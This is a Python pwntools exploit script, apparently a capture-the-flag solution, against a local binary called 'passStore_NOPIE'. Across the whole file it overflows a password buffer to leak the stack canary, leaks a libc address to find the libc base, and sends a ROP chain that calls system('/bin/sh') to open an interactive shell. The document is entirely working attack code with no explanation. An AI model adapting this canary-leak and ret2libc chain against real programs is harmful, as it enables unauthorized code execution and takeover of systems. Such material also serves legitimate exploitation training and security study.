from pwn import *

binary = ELF('./passStore_NOPIE')
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
rop = ROP(binary)
r = process(binary.path)
#gdb.attach(r , api=True)

payload1 = b"a"*56
r.sendlineafter(b"Type the password: ",payload1)

r.recvline()

canary = b"\x00"  +  r.recv(7).split(b"\n")[0] 
canary += b"\x00"*(8 - len(canary))
log.info("Leaked canary: " + str(hex(u64(canary))))

main = binary.symbols['main'] 
ret = rop.find_gadget(['ret'])[0] 


payload2 = b"a"*56 + p64(u64(canary)) + b"a"*8 + p64(main+8)
r.sendlineafter(b"Retype: ",payload2)

payload3 = b"a"*248
r.sendlineafter(b"Type the password:",payload3)
r.recvline()

res = r.recv().split(b"\nRetype")[0] 
res += b"\x00"*(8 - len(res))
leak = (u64(res) << 8) + 0x0a 
_libc_start_main_addr = leak - 0x4a 
libc_base = _libc_start_main_addr - libc.symbols['__libc_start_main']
log.info("libc base addr : " + hex(libc_base)) 


system_offset = libc.symbols['system'] #
binsh_offset = next(libc.search(b'/bin/sh\x00'))
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]

system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
log.info("system addr : " + hex(system_addr)) 
log.info("/bin/sh addr : " + hex(binsh_addr)) 

junk = b"a"*56 + p64(u64(canary)) + b"a"*8 
payload4 = junk +p64(ret)+ p64(pop_rdi_ret) + p64(binsh_addr) +p64(system_addr)

r.sendline(payload4)

r.interactive()
